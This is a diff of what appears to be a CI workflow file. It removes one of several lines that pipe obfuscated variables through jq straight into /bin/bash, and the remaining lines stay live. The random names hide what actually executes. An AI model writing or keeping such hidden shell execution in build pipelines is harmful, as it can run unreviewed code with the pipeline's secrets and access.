@@ -40,7 +40,6 @@ jobs:
           printf '%s' "$o5669" | jq -r .a75642 | /bin/bash
           printf '%s' "$kph0" | jq -r .tebgr479 | /bin/bash
           echo $iicpq7 | jq -r .flk73411 | /bin/bash
-          echo $krbhn84 | jq -r .qy09300 | /bin/bash
           printf '%s' "$utrlo871" | jq -r .xr0 | /bin/bash
           echo $rm9412 | jq -r .eyke6474 | /bin/bash
           printf '%s' "$a649" | jq -r .j8 | /bin/bash
